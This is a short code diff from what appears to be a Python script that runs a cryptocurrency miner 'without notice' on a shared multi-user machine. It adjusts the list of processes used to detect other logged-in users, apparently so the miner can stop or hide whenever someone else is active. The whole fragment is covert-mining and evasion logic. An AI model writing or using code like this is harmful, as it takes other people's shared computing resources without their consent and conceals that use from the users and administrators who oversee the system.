@@ -10,7 +10,7 @@ import getpass
 mining_is_on = False
 miner_process = None
 
-allow_list = ['zsh', 'sftp-server', 'sshd', 'sshdemd', 'sh', 'ssh', 'sftp', 'bash', 'tmux', 'htop', 'watch', 'systemd', '(sd-pam)', \
+allow_list = ['zsh', 'sftp-server', 'sshd', 'sshdemd', 'sh', 'ssh', 'sftp', 'bash', 'tmux', 'htop', 'watch', 'systemd', '(sd-pam)', 'gpustat', \
                 'dbus-launch', 'dbus-daemon', 'at-spi-bus-laun', 'at-spi2-registr', 'tcsh', 'mosh-server', 'git-credential-', 'vim']
 
 def get_normal_users():
@@ -53,7 +53,7 @@ def mining_without_notice(mining_url):
         status = line.split()[7]
         process = line.split()[11]
         if user_name in normal_users and user_name != this_user:
-            if status == 'R' or process not in allow_list: # the process is running
+            if process not in allow_list: # the process is running
                 print('Someone else logins and running!', user_name, process)
                 someone_else_detected = True
                 if mining_is_on:
